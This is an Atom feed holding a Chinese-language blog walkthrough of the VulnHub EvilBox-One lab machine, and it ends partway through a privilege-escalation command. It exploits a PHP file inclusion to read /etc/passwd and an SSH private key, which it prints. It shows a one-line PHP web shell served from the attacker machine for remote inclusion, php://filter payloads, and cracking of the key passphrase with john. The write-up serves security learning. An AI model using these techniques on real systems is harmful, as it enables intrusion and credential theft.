<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Patrik&#39;s Blog</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2022-04-12T07:12:34.577Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>Patrik</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>VulnHub-6-EvilBox-one</title>
    <link href="http://example.com/2022/04/12/week6/"/>
    <id>http://example.com/2022/04/12/week6/</id>
    <published>2022-04-12T07:12:34.576Z</published>
    <updated>2022-04-12T07:12:34.577Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>靶机：<a href="https://download.vulnhub.com/evilbox/EvilBox---One.ova">https://download.vulnhub.com/evilbox/EvilBox---One.ova</a><br>  难度：低→中<br>  目标：取得 root 权限 + 2 Flag</p></blockquote><span id="more"></span><h3 id="1-主机发现"><a href="#1-主机发现" class="headerlink" title="1.主机发现"></a>1.主机发现</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ifconfig </span><br><span class="line">#本机IP:192.168.0.110 攻击机IP</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master/6/image-20211208193627499-20220106215922469-20220106220051089-20220106221119106.png" alt="image-20211208193627499"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fping -gaq 192.168.0.0/24</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master/6/image-20211208195647496.png" alt="image-20211208195647496"></p><p>探测到的存活主机列表中，192.168.0.108是目标靶机的IP地址</p><h3 id="2-端口扫描"><a href="#2-端口扫描" class="headerlink" title="2.端口扫描"></a>2.端口扫描</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p- 192.168.0.108</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master/6/image-20211208195931120.png" alt="image-20211208195931120"></p><p>目标靶机开放了22，80端口</p><h3 id="3-端口服务探测"><a href="#3-端口服务探测" class="headerlink" title="3.端口服务探测"></a>3.端口服务探测</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap -p22,80 -A 192.168.0.108</span><br><span class="line"># -A参数的作用大致等于-sV -sC -O,比较方便</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master/6/image-20211208200300990.png" alt="image-20211208200300990"></p><p>扫描结果显示目标靶机的</p><p>22端口开放了ssh服务，并列举了些不同方式加密的密钥信息</p><p>80端口开放了Apache的Web服务，Debian操作系统</p><h3 id="4-访问80端口"><a href="#4-访问80端口" class="headerlink" title="4.访问80端口"></a>4.访问80端口</h3><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211208200757525.png" alt="image-20211208200757525"></p><p>只是一个简单的Apache页面，未发现有用信息</p><h3 id="5-爆破22端口"><a href="#5-爆破22端口" class="headerlink" title="5.爆破22端口"></a>5.爆破22端口</h3><p><img src="https://gitee.com/byesec/picture/raw/master/6/image-20211208201510674.png" alt="image-20211208201510674"></p><p>对22端口root用户的密码进行了爆破 但最终无果</p><h3 id="6-目录扫描"><a href="#6-目录扫描" class="headerlink" title="6.目录扫描"></a>6.目录扫描</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http://192.168.0.108 -w /usr/share/seclists/Discovery/Web-Content/directory-list-1.0.txt -x txt,php,jsp,html</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master/6/image-20211208204109760.png" alt="image-20211208204109760"></p><p>发现的目录&#x2F;文件有 index.html,robots.txt,secret 分别尝试：</p><h4 id="1-ip-x2F-index-html"><a href="#1-ip-x2F-index-html" class="headerlink" title="1)ip&#x2F;index.html"></a>1)ip&#x2F;index.html</h4><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211208203719626.png" alt="image-20211208203719626"></p><p>主页亦是先前的80端口默认页面..</p><h4 id="2-ip-x2F-robots-txt"><a href="#2-ip-x2F-robots-txt" class="headerlink" title="2)ip&#x2F;robots.txt"></a>2)ip&#x2F;robots.txt</h4><p><img src="https://gitee.com/byesec/picture/raw/master/6/image-20211208201957960.png" alt="image-20211208201957960"></p><p>页面内显示了“Hello H4x0r”，怀疑是否是用户名或者路径，尝试针对用户名H4x0r的ssh密码爆破，结果失败..</p><p>尝试访问ip&#x2F;H4x0r结果也是失败..</p><h4 id="3-ip-x2F-secret"><a href="#3-ip-x2F-secret" class="headerlink" title="3)ip&#x2F;secret"></a>3)ip&#x2F;secret</h4><p><img src="https://gitee.com/byesec/picture/raw/master/6/image-20211208203843733.png" alt="image-20211208203843733"></p><p>访问后发现是个空目录，查看源码也没有任何信息..</p><p>再对ip&#x2F;secret下的目录进行扫描</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http://192.168.0.108/secret -w /usr/share/seclists/Discovery/Web-Content/directory-list-1.0.txt -x txt,php,jsp,html</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master/6/image-20211208204358197.png" alt="image-20211208204358197"></p><p>发现了&#x2F;secret目录下的index.html，evil.php 分别尝试：</p><h4 id="4-ip-x2F-secret-x2F-index-html"><a href="#4-ip-x2F-secret-x2F-index-html" class="headerlink" title="4)ip&#x2F;secret&#x2F;index.html"></a>4)ip&#x2F;secret&#x2F;index.html</h4><p><img src="https://gitee.com/byesec/picture/raw/master/6/image-20211208204647211.png" alt="image-20211208204647211"></p><p>空白😱..</p><h4 id="5-ip-x2F-secret-x2F-evil-php"><a href="#5-ip-x2F-secret-x2F-evil-php" class="headerlink" title="5)ip&#x2F;secret&#x2F;evil.php"></a>5)ip&#x2F;secret&#x2F;evil.php</h4><p><img src="https://gitee.com/byesec/picture/raw/master/6/image-20211208204721125.png" alt="image-20211208204721125"></p><p>空白😱..</p><p>截止到目前，还没有任何直接的发现，停留在此..😮‍💨</p><h3 id="7-绝境的求救信–php参数爆破"><a href="#7-绝境的求救信–php参数爆破" class="headerlink" title="7.绝境的求救信–php参数爆破"></a>7.绝境的求救信–php参数爆破</h3><p>思考🤔：php页面是如何向服务器端提交数据的呢？</p><p>Emm:通过一些参数赋值</p><p><a href="http://192.168.0.108/secret/evil.php?**a=123&amp;b=456">http://192.168.0.108/secret/evil.php?**a=123&amp;b=456</a>**</p><p>回忆🤔：平时做攻击、注入等时的大致步骤都是，在URL先寻找参数名称，再尝试写入payload完成注入，包括使用POST方法也是寻找参数在body里寻找数据注入</p><p>💊得救的关键就是–&gt;<strong>寻找正确的参数</strong>–&gt;<strong>参数爆破</strong>！！！💣</p><p>确定目标：</p><p><a href="http://192.168.0.108/secret/evil.php?**cs**=**csz">http://192.168.0.108/secret/evil.php?**cs**=**csz</a>**</p><p>对<strong>参数名位置</strong>(cs)和<strong>参数值位置</strong>(csz)</p><p>工具选择：</p><p>第一反应是bp，但是这里为了拓展武器选择使用ffuf</p><p>字典选择：</p><p>​针对参数名选择burp-parameter-names.txt</p><p>​针对参数值选择DIY大法🐸</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi DIY.txt #放入一些数字、字母、符号</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat DIY.txt</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master/6/image-20211208211435869.png" alt="image-20211208211435869"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:cs -w DIY.txt:csz -u http://192.168.0.108/secret/evil.php?cs=csz -fs 0</span><br><span class="line">#-w分别指定两个字典  </span><br><span class="line">#:为了区分字典，指定参数</span><br><span class="line">#-fs 0 过滤掉无效信息（返回页面为空 0），使结果更清晰易读</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master/6/image-20211208213846947.png" alt="image-20211208213846947"></p><p>结果很不理想..😫</p><p>分析一下：</p><p>刚才的参数名字典中应该是涵盖了大部分常用参数名 应该不存在直接问题✅</p><p>刚才的赋值字典是手动输入了几个字母、数字、符号 怀疑是这里掉了链子❌</p><p>稍微变换一下思路：</p><p>在参数名的位置仍使用burp-parameter-names.txt字典，参数值的位置放置一个目标靶机上<strong>已经确定存在的文件</strong>，当在爆破参数名的过程中若出现了一个可用的参数名时，那么该参数便会引用该<strong>已经确定存在的文件</strong>，是否有可能利用文件包含读取文件的信息？</p><p>结合之前的目录扫描，不难想到这个<strong>已经确定存在的文件</strong>不就是<strong>index.html</strong>吗？</p><p>重新构建：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u http://192.168.0.108/secret/evil.php?FUZZ=../index.html -fs 0</span><br><span class="line">#取消参数值的字典 替换为../index.html</span><br><span class="line">#FUZZ模糊测试关键字</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master/6/image-20211208213756058.png" alt="image-20211208213756058"></p><p>结果显示：参数名称command可用</p><p>测试访问<a href="http://192.168.0.108/secret/evil.php?command=../index.html">http://192.168.0.108/secret/evil.php?command=../index.html</a></p><p><img src="https://gitee.com/byesec/picture/raw/master/6/image-20211208214129645.png" alt="image-20211208214129645"></p><p>可以正常访问</p><p>测试访问<a href="http://192.168.0.108/secret/evil.php?command=evil.php">http://192.168.0.108/secret/evil.php?command=evil.php</a></p><p><img src="https://gitee.com/byesec/picture/raw/master/6/image-20211208214243394.png" alt="image-20211208214243394"></p><p>访问结果仍为空白页面，查看源码为1行空白</p><p>测试是否存在文件包含漏洞</p><p>访问<a href="http://192.168.0.108/secret/evil.php?command=../../../../../../../../etc/passwd">http://192.168.0.108/secret/evil.php?command=../../../../../../../../etc/passwd</a></p><p><img src="https://gitee.com/byesec/picture/raw/master/6/image-20211208214549193.png" alt="image-20211208214549193"></p><p>结果成功读取&#x2F;etc&#x2F;passwd，说明存在文件包含漏洞</p><h3 id="8-远程文件包含"><a href="#8-远程文件包含" class="headerlink" title="8.远程文件包含"></a>8.远程文件包含</h3><p>尝试在kali攻击机上构造一句话木马</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd /var/www/html</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi a.php</span><br></pre></td></tr></table></figure><blockquote><?php $var=shell_exec($_GET['cmd']); echo $var?></blockquote><p><img src="https://gitee.com/byesec/picture/raw/master/6/image-20211208215246492.png" alt="image-20211208215246492"></p><p>利用远程文件包含上传</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl start apache2 #在kali本机开启web服务 可在执行后 使目标可以访问到a.php</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master/6/image-20211208215647665.png" alt="image-20211208215647665"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.0.108/secret/evil.php?command=http://192.168.0.110/a.php?cmd=id</span><br><span class="line">#尝试执行id命令</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master/6/image-20211208220144981.png" alt="image-20211208220144981"></p><p>并没有返回，尝试了ls等其他命令也没有返回，说明此处利用远程文件包含是行不通的</p><h3 id="9-php封装器"><a href="#9-php封装器" class="headerlink" title="9.php封装器"></a>9.php封装器</h3><p>php作为一种语言，提供许多其他协议的访问方式、许多封装器，例如php:&#x2F;&#x2F; file:&#x2F;&#x2F; ftp:&#x2F;&#x2F; data:&#x2F;&#x2F; zip:&#x2F;&#x2F;</p><p>利用php:&#x2F;&#x2F;来读取目标系统上的php文件（当访问目标服务器上的php文件时，目标服务器会使用php执行代码来处理该文件，故往往读取不到php文件的源码，读到的只是代码执行后返回的结果。但若是先使用base64进行编码后，目标服务器无法正常读取可识别的代码，不但不会执行该代码，反而会返回被base64编码后的字符串）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.0.108/secret/evil.php?command=php://filter/convert.base64-encode/resource=evil.php</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master/6/image-20211208221355954.png" alt="image-20211208221355954"></p><p>成功返回base64编码的字符串（evil.php源码）</p><blockquote><p>PD9waHAKICAgICRmaWxlbmFtZSA9ICRfR0VUWydjb21tYW5kJ107CiAgICBpbmNsdWRlKCRmaWxlbmFtZSk7Cj8+Cg&#x3D;&#x3D;</p></blockquote><p>base64解码后：</p><p><img src="https://gitee.com/byesec/picture/raw/master/6/image-20211208221618439.png" alt="image-20211208221618439"></p><blockquote><?php$filename = $_GET['command'];   #读取赋值include($filename);             #引用读取到的赋值?></blockquote><p>测试向目标写入能否成功，可能没有写入的权限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo -n 123 | base64       #得到123经过base64编码的字符</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master/6/image-20211208222226443.png" alt="image-20211208222226443"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.0.108/secret/evil.php?command=php://filter/write=convert.base64-decode/resource=test.php&amp;txt=MTIz</span><br><span class="line">#利用php://封装器将MTIz解码后写入名为test.php的文件</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master/6/image-20211208222639627.png" alt="image-20211208222639627"></p><p><img src="https://gitee.com/byesec/picture/raw/master/6/image-20211208222705794.png" alt="image-20211208222705794"></p><p>访问失败 说明刚才的写入操作失败了..再次陷入僵局..</p><h3 id="10-mowree"><a href="#10-mowree" class="headerlink" title="10.mowree?"></a>10.mowree?</h3><p>又重新翻看了之前搜集到的信息，发现在&#x2F;etc&#x2F;passwd目录下，存在一个名为mowree的用户</p><p><img src="https://gitee.com/byesec/picture/raw/master/6/image-20211208223113476.png" alt="image-20211208223113476"></p><p>只有用户名，那么是否可以再尝试一下ssh登陆密码爆破？</p><p>先确认一下ssh登陆的认证方式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh mowree@192.168.0.108 -v</span><br></pre></td></tr></table></figure><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211208223554832.png" alt="image-20211208223554832"></p><p><img src="https://gitee.com/byesec/picture/raw/master/6/image-20211208223639905.png" alt="image-20211208223639905"></p><p>结果显示目标支持password密码认证以外，还支持publickey公钥身份认证</p><p>那么联想到 一个能够登陆该服务器的的用户必然存在其登陆所用的公钥,那么该公钥文件位于哪里呢？</p><p>是否存在于用户目录文件下呢？结合利用文件包含读文件！</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.0.108/secret/evil.php?command=../../../../../home/mowree/.ssh/authorized_keys</span><br><span class="line">#.ssh/authorized_keys 已经授权的用户的默认公钥存储路径</span><br></pre></td></tr></table></figure><p>如果能够读取到则说明服务器是已授权允许该用户登陆的</p><p><img src="https://gitee.com/byesec/picture/raw/master/6/image-20211208225112071.png" alt="image-20211208225112071"></p><p>成功读取到存放在目标用户mowree目录下的公钥</p><blockquote><p>ssh-rsa  AAAAB3NzaC1yc2EAAAADAQABAAABAQDAXfEfC22Bpq40UDZ8QXeuQa6EVJPmW6BjB4Ud&#x2F;knShqQ86qCUatKaNlMfdpzKaagEBtlVUYwit68VH5xHV&#x2F;QIcAzWi+FNw0SB2KTYvS514pkYj2mqrONdu1LQLvgXIqbmV7MPyE2AsGoQrOftpLKLJ8JToaIUCgYsVPHvs9Jy3fka+qLRHb0HjekPOuMiq19OeBeuGViaqILY+w9h19ebZelN8fJKW3mX4mkpM7eH4C46J0cmbK3ztkZuQ9e8Z14yAhcehde+sEHFKVcPS0WkHl61aTQoH&#x2F;XTky8dHatCUucUATnwjDvUMgrVZ5cTjr4Q4YSvSRSIgpDP2lNNs1B7 mowree@EvilBoxOne</p></blockquote><p>页面返回信息：公私钥生成使用RSA算法、用户mowree登录到EvilBoxOne</p><p>既然已经被授权–存在公钥–那么是否也应该在默认目录下存在私钥呢？</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.0.108/secret/evil.php?command=../../../../../home/mowree/.ssh/id_rsa</span><br><span class="line">#.ssh/id_rsa 已经授权的用户的默认私钥存储路径</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master/6/image-20211208225724998.png" alt="image-20211208225724998"></p><p>成功读取到目标用户mowree目录下的私钥(右键源码 格式更佳！)</p><blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&gt;-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line">&gt;Proc-Type: 4,ENCRYPTED</span><br><span class="line">&gt;DEK-Info: DES-EDE3-CBC,9FB14B3F3D04E90E</span><br><span class="line"></span><br><span class="line">&gt;uuQm2CFIe/eZT5pNyQ6+K1Uap/FYWcsEklzONt+x4AO6FmjFmR8RUpwMHurmbRC6</span><br><span class="line">&gt;hqyoiv8vgpQgQRPYMzJ3QgS9kUCGdgC5+cXlNCST/GKQOS4QMQMUTacjZZ8EJzoe</span><br><span class="line">&gt;o7+7tCB8Zk/sW7b8c3m4Cz0CmE5mut8ZyuTnB0SAlGAQfZjqsldugHjZ1t17mldb</span><br><span class="line">&gt;+gzWGBUmKTOLO/gcuAZC+Tj+BoGkb2gneiMA85oJX6y/dqq4Ir10Qom+0tOFsuot</span><br><span class="line">&gt;b7A9XTubgElslUEm8fGW64kX3x3LtXRsoR12n+krZ6T+IOTzThMWExR1Wxp4Ub/k</span><br><span class="line">&gt;HtXTzdvDQBbgBf4h08qyCOxGEaVZHKaV/ynGnOv0zhlZ+z163SjppVPK07H4bdLg</span><br><span class="line">&gt;9SC1omYunvJgunMS0ATC8uAWzoQ5Iz5ka0h+NOofUrVtfJZ/OnhtMKW+M948EgnY</span><br><span class="line">&gt;zh7Ffq1KlMjZHxnIS3bdcl4MFV0F3Hpx+iDukvyfeeWKuoeUuvzNfVKVPZKqyaJu</span><br><span class="line">&gt;rRqnxYW/fzdJm+8XViMQccgQAaZ+Zb2rVW0gyifsEigxShdaT5PGdJFKKVLS+bD1</span><br><span class="line">&gt;tHBy6UOhKCn3H8edtXwvZN+9PDGDzUcEpr9xYCLkmH+hcr06ypUtlu9UrePLh/Xs</span><br><span class="line">&gt;94KATK4joOIW7O8GnPdKBiI+3Hk0qakL1kyYQVBtMjKTyEM8yRcssGZr/MdVnYWm</span><br><span class="line">&gt;VD5pEdAybKBfBG/xVu2CR378BRKzlJkiyqRjXQLoFMVDz3I30RpjbpfYQs2Dm2M7</span><br><span class="line">&gt;Mb26wNQW4ff7qe30K/Ixrm7MfkJPzueQlSi94IHXaPvl4vyCoPLW89JzsNDsvG8P</span><br><span class="line">&gt;hrkWRpPIwpzKdtMPwQbkPu4ykqgKkYYRmVlfX8oeis3C1hCjqvp3Lth0QDI+7Shr</span><br><span class="line">&gt;Fb5w0n0qfDT4o03U1Pun2iqdI4M+iDZUF4S0BD3xA/zp+d98NnGlRqMmJK+StmqR</span><br><span class="line">&gt;IIk3DRRkvMxxCm12g2DotRUgT2+mgaZ3nq55eqzXRh0U1P5QfhO+V8WzbVzhP6+R</span><br><span class="line">&gt;MtqgW1L0iAgB4CnTIud6DpXQtR9l//9alrXa+4nWcDW2GoKjljxOKNK8jXs58SnS</span><br><span class="line">&gt;62LrvcNZVokZjql8Xi7xL0XbEk0gtpItLtX7xAHLFTVZt4UH6csOcwq5vvJAGh69</span><br><span class="line">&gt;Q/ikz5XmyQ+wDwQEQDzNeOj9zBh1+1zrdmt0m7hI5WnIJakEM2vqCqluN5CEs4u8</span><br><span class="line">&gt;p1ia+meL0JVlLobfnUgxi3Qzm9SF2pifQdePVU4GXGhIOBUf34bts0iEIDf+qx2C</span><br><span class="line">&gt;pwxoAe1tMmInlZfR2sKVlIeHIBfHq/hPf2PHvU0cpz7MzfY36x9ufZc5MH2JDT8X</span><br><span class="line">&gt;KREAJ3S0pMplP/ZcXjRLOlESQXeUQ2yvb61m+zphg0QjWH131gnaBIhVIj1nLnTa</span><br><span class="line">&gt;i99+vYdwe8+8nJq4/WXhkN+VTYXndET2H0fFNTFAqbk2HGy6+6qS/4Q6DVVxTHdp</span><br><span class="line">&gt;4Dg2QRnRTjp74dQ1NZ7juucvW7DBFE+CK80dkrr9yFyybVUqBwHrmmQVFGLkS2I/</span><br><span class="line">&gt;8kOVjIjFKkGQ4rNRWKVoo/HaRoI/f2G6tbEiOVclUMT8iutAg8S4VA==</span><br><span class="line">&gt;-----END RSA PRIVATE KEY-----</span><br></pre></td></tr></table></figure></blockquote><h3 id="11-手握公私钥尝试登陆"><a href="#11-手握公私钥尝试登陆" class="headerlink" title="11.手握公私钥尝试登陆"></a>11.手握公私钥尝试登陆</h3><p>清点一下：</p><p>服务器支持公钥的认证方式–用户的目录下存在公钥–服务器允许用户mowree使用公钥登陆–拿取到了私钥–拥有私钥的任何用户都可以使用私钥尝试登陆服务器–不需要账号密码–利用公钥证明身份</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd ~</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi id_rsa</span><br></pre></td></tr></table></figure><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211208231311174.png" alt="image-20211208231311174"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod 600 id_rsa</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master/6/image-20211208231920190.png" alt="image-20211208231920190"></p><p>使用私钥ssh登陆</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh mowree@192.168.0.108 -i id_rsa </span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master/6/image-20211208232318351.png" alt="image-20211208232318351"></p><p>再遇密码..没完没了..</p><h3 id="12-爆破狂人约翰"><a href="#12-爆破狂人约翰" class="headerlink" title="12.爆破狂人约翰"></a>12.爆破狂人约翰</h3><p>霸王硬上弓–&gt;爆破💣–&gt;选择一本足够强大的字典📖</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp /usr/share/wordlists/rockyou.txt.gz . </span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gunzip rockyou.txt.gz</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master/6/image-20211208232910798.png" alt="image-20211208232910798"></p><p>使用john前，需将私钥转换为该工具可以使用爆破的格式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd /usr/share/john</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ssh2john.py ~/id_rsa &gt; ~/hash</span><br></pre></td></tr></table></figure><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211208233910653.png" alt="image-20211208233910653"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john hash --wordlist=rockyou.txt</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master/6/image-20211208234313571.png" alt="image-20211208234313571"></p><p>爆破结果得到的密码为：unicorn</p><p>胸有成竹的进行登陆</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh mowree@192.168.0.108 -i id_rsa </span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master/6/image-20211208234716317.png" alt="image-20211208234716317"></p><p>终于突破了边界 获取到了第一个flag 56Rbp0soobpzWSVzKh9YOvzGLgtPZQ</p><p>另外一个flag应该是需要root用户才能拿到的</p><h3 id="13-提权冲锋🐛"><a href="#13-提权冲锋🐛" class="headerlink" title="13.提权冲锋🐛"></a>13.提权冲锋🐛</h3><p>尝试提权</p><h4 id="1-查看当前有无计划任务"><a href="#1-查看当前有无计划任务" class="headerlink" title="1)查看当前有无计划任务"></a>1)查看当前有无计划任务</h4><p>利用脚本就…</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crontab -l    </span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master/6/image-20211208235115298.png" alt="image-20211208235115298"></p><p>并没有😖</p><h4 id="2-查看sudo权限配置方面有无缺陷"><a href="#2-查看sudo权限配置方面有无缺陷" class="headerlink" title="2)查看sudo权限配置方面有无缺陷"></a>2)查看sudo权限配置方面有无缺陷</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l       </span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master/6/image-20211208235258827.png" alt="image-20211208235258827"></p><p>并没有😖</p><h4 id="3-查看内核是否存在漏洞"><a href="#3-查看内核是否存在漏洞" class="headerlink" title="3)查看内核是否存在漏洞"></a>3)查看内核是否存在漏洞</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname -a      </span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit 4.19 </span><br></pre></td></tr></table></figure><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211208235652875.png" alt="image-20211208235652875"></p><p>几番尝试后 都失败了…..裂开……😭</p><h4 id="4-利用find-suid"><a href="#4-利用find-suid" class="headerlink" title="4)利用find suid"></a>4)利用find suid</h4><p>寻找这台靶机上的哪些程序&#x2F;可执行文件是具有suid权限且属主是root</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find / -perm /4000 2&gt;/dev/null</span><br><span class="line">#4000即为suid权限</span><br><span class="line">#因为是从/根目录搜索的所有即搜索整台靶机上的程序 可能因权限不足会存在报错 为了方便看到成功信息 将错误信息定向到/dev/null</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master/6/image-20211209000653290.png" alt="image-20211209000653290"></p><p>结果很遗憾这些可执行文件都是系统默认的 即是安全的 没能够找到突破的点</p><h4 id="5-利用find-sgid"><a href="#5-利用find-sgid" class="headerlink" title="5)利用find sgid"></a>5)利用find sgid</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">find / -perm /2000 2&gt;/dev/null</span><br><span class="line">#2000即为sgid权限</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master/6/image-20211209001212656.png" alt="image-20211209001212656"></p><p>依然是默认的..很安全..</p><h4 id="6-寻找系统中可写的文件"><a href="#6-寻找系统中可写的文件" class="headerlink" title="6)寻找系统中可写的文件"></a>6)寻找系统中可写的文件</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / 